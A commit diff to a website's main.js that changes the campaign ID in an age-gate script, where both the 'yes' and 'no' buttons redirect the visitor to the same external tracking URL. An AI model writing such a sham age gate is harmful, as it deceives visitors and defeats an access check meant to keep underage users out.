e4ee72685aaa7accc4c3947b9629540c5c7dc51d
superssusa <nikraw512@gmail.com>
2025-11-01 13:58:50 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -81,11 +81,11 @@ if(form){
   function closeGate(){ bd.style.display='none'; bd.remove(); }
   bd.querySelector('#age-yes').addEventListener('click',
                                                 function(){
-   window.location.href = "https://f3w1.com/?utm_campaign=kO8oVje0Gd&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+   window.location.href = "https://f3w1.com/?utm_campaign=k6LmDW9yYu&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
                                                
    bd.querySelector('#age-no').addEventListener('click', 
                                                function(){
-   window.location.href = "https://f3w1.com/?utm_campaign=kO8oVje0Gd&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+   window.location.href = "https://f3w1.com/?utm_campaign=k6LmDW9yYu&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   }); 
 })();
